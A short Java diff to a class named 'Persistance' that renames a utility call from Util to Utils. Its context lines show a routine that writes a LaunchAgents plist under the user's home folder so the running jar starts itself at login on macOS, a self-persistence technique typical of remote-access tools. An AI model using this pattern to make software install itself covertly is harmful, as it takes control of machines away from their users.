@@ -5,6 +5,7 @@ import java.io.FileWriter;
 import java.io.PrintWriter;
 
 import com.redpois0n.common.os.OperatingSystem;
+import com.redpois0n.utils.Utils;
 
 public class Persistance extends Thread {
 
@@ -28,7 +29,7 @@ public class Persistance extends Thread {
 					}
 					
 				} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
-					String thispath = Util.getJarFile().getAbsolutePath();
+					String thispath = Utils.getJarFile().getAbsolutePath();
 					File startupFile = new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + new File(thispath).getName().replace(".jar", ".plist"));
 					
 					if (!new File(startupFile.getAbsolutePath().replace("file:", "")).exists()) {
